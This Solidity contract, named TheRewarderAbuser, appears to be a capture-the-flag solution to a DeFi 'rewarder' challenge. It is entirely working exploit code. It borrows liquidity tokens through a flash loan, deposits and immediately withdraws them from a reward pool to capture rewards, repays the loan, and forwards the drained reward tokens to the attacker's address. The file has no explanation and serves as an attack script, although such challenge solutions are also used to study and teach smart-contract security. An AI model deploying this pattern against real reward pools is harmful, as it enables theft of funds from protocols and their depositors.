// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "hardhat/console.sol";
interface ITheRewarderPool {
    function deposit(uint256 amountToDeposit) external;
    function withdraw(uint256 amountToWithdraw) external;
}

interface IFlashLoanerPool {
    function flashLoan(uint256 amount) external;
}

contract TheRewarderAbuser {
    ITheRewarderPool rewarderPool;
    IFlashLoanerPool flashLoanerPool;
    IERC20 liquitidyToken;
    IERC20 rewardsToken;
    address attackSender;

    function receiveFlashLoan(uint256 amount) external {
        liquitidyToken.approve(address(rewarderPool), amount);
        rewarderPool.deposit(amount);
        rewarderPool.withdraw(amount);
        liquitidyToken.transfer(address(flashLoanerPool), amount);

        uint256 amountToSend = rewardsToken.balanceOf(address(this));
        rewardsToken.transfer(attackSender, amountToSend);
    }

    function attack(address _rewarderPool, address _flashLoaner, address _token, address _rewardsToken, uint256 _amount) external {
        rewarderPool = ITheRewarderPool(_rewarderPool);
        flashLoanerPool = IFlashLoanerPool(_flashLoaner);
        liquitidyToken = IERC20(_token);
        rewardsToken = IERC20(_rewardsToken);
        attackSender = msg.sender;

        IFlashLoanerPool(_flashLoaner).flashLoan(_amount);
    }
}
